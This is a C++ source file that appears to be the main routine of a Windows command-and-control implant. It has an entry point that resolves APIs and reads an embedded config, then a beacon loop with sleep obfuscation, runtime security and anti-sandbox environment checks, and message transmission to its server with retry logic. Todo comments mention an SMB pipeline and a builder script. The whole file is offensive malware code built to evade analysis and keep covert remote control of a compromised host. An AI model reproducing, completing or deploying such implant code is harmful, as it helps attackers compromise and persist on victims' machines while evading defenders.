#include <core/include/implant.hpp>

// todo: make config separate translation unit and compile core as static lib
// todo: test smb pipeline and message streaming/parsing
// todo: fix builder script

namespace Implant {

    VOID Entrypoint(HMODULE Base) {
        Memory::ContextInit();
        MainRoutine();
    }

    VOID MainRoutine() {
        HEXANE

        Memory::ResolveApi();
        if (ntstatus != ERROR_SUCCESS) {
            return_defer(ntstatus);
        }

        Memory::ReadConfig();
        do {
            Opsec::SleepObf();
            Opsec::RuntimeSecurityCheck();

            if (!Opsec::CheckTime()) {
                continue;
            }

            if (!Ctx->Session.Checkin) {
                Opsec::SeCheckEnvironment();
                if (ntstatus == ERROR_BAD_ENVIRONMENT) {
                    return_defer(ntstatus);
                }
            }

            Message::MessageTransmit();
            if (ntstatus != ERROR_SUCCESS) {
                Ctx->Session.Retry++;

                if (Ctx->Session.Retry == 3) {
                    break;
                }
            }
            else {
                Ctx->Session.Retry = 0;
            }
        }
        while (TRUE);

    defer:
        FreeApi(Ctx);
    }
}
